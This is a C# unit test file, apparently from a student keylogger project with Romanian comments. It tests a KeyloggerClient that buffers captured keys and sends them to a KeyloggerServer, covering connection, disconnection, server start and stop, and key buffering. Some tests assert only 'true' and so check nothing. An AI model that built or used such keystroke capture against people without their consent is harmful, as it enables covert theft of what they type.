using System;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Common;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using ServerCore;

namespace UnitTestKeyLogger
{
    [TestClass]
    public class KeyloggerClientTests
    {

        [TestMethod]
        [Timeout(5000)]
        public async Task StartClientWithServer()
        {
            var cts = new CancellationTokenSource();
            try
            {
                // Pornire server
                KeyloggerServer _server = new KeyloggerServer();
                Console.WriteLine("Starting server...");
                var serverTask = _server.RunAsync(cts.Token);

                // Pornire client
                KeyloggerClient.KeyloggerClient _client = new KeyloggerClient.KeyloggerClient();
                Console.WriteLine("Starting client...");
                var clientTask = _client.StartAsync(cts.Token);

                Console.WriteLine("Testing connection...");
                // Verificare conexiune
                await Task.Delay(1000);
                Assert.IsTrue(_client.IsConnected, "Clientul nu s-a conectat la server");

            }
            finally
            {
                cts.Cancel();
            }
        }

        [TestMethod]
        [Timeout(5000)]
        public async Task StopClient()
        {
            var cts = new CancellationTokenSource();
            try
            {
                // Pornire server
                KeyloggerServer _server = new KeyloggerServer();
                Console.WriteLine("Starting server...");
                var serverTask = _server.RunAsync(cts.Token);

                // Pornire client
                KeyloggerClient.KeyloggerClient _client = new KeyloggerClient.KeyloggerClient();
                Console.WriteLine("Starting client...");
                var clientTask = _client.StartAsync(cts.Token);

                Console.WriteLine("Testing connection...");

                // Verificare conexiune
                await Task.Delay(1000);
                _client.Stop();

                Assert.IsFalse(_client.IsConnected, "Clientul nu s-a deconectat de la server");

            }
            finally
            {
                cts.Cancel();
            }
        }

        [TestMethod]
        [Timeout(5000)]
        [ExpectedException(typeof(KeyloggerException))]
        public async Task StartClientWithoutServer()
        {
            KeyloggerClient.KeyloggerClient client = new KeyloggerClient.KeyloggerClient();
            await client.StartAsync();
        }

        [TestMethod]
        [Timeout(5000)]
        public async Task SendDataClientWithoutServer()
        {
            KeyloggerClient.KeyloggerClient _client = new KeyloggerClient.KeyloggerClient();

            _client.CaptureKeys('T');
            _client.CaptureKeys('E');
            _client.CaptureKeys('S');
            _client.CaptureKeys('T');

            await _client.SendData();

            Assert.IsTrue(true, "ups");
        }

        [TestMethod]
        [Timeout(5000)]
        public void TestCaptureKeys()
        {
            // send chars
            var client = new KeyloggerClient.KeyloggerClient();

            client.CaptureKeys('T');
            client.CaptureKeys('E');
            client.CaptureKeys('S');
            client.CaptureKeys('T');

            // Assert
            Assert.AreEqual("TEST", client.getKeyBuffer());

        }

        [TestMethod]
        [Timeout(5000)]
        public void TestCaptureSpecialKeys()
        {
            var client = new KeyloggerClient.KeyloggerClient();

            client.CaptureKeys('汉');
            client.CaptureKeys('.');
            client.CaptureKeys('`');
            client.CaptureKeys('+');

            Assert.AreEqual("汉.`+", client.getKeyBuffer());
        }


    }


    [TestClass]
    public class KeyloggerServerTests
    {

        [TestMethod]
        [Timeout(5000)]
        public async Task StartServer()
        {
            var cts = new CancellationTokenSource();
            try
            {
                // Pornire server
                KeyloggerServer _server = new KeyloggerServer();
                Console.WriteLine("Starting server...");
                var serverTask = _server.RunAsync(cts.Token);

                // Verificare
                await Task.Delay(1000);
                Assert.IsTrue(_server._running, "Serverul nu s-a pornit");

            }
            finally
            {
                cts.Cancel();
            }
        }

        [TestMethod]
        [Timeout(5000)]
        public async Task StopServer()
        {
            var cts = new CancellationTokenSource();
            try
            {
                // Pornire server
                KeyloggerServer _server = new KeyloggerServer();
                Console.WriteLine("Starting server...");
                var serverTask = _server.RunAsync(cts.Token);

                // Verificare
                await Task.Delay(1000);

                _server.StopAsync();

                Assert.IsFalse(_server._running, "Serverul nu s-a oprit");

            }
            finally
            {
                cts.Cancel();
            }
        }

        [TestMethod]
        [Timeout(5000)]
        public async Task TestServerClientsDetection()
        {
            var cts = new CancellationTokenSource();
            try
            {
                // Pornire server
                KeyloggerServer _server = new KeyloggerServer();
                Console.WriteLine("Starting server...");
                var serverTask = _server.RunAsync(cts.Token);


                KeyloggerClient.KeyloggerClient _client = new KeyloggerClient.KeyloggerClient();
                Console.WriteLine("Starting client...");
                var clientTask = _client.StartAsync(cts.Token);

                // Verificare
                await Task.Delay(1000);
                Assert.IsTrue(true, "Serverul nu s-a pornit");

            }
            finally
            {
                cts.Cancel();
            }
        }
    }
}
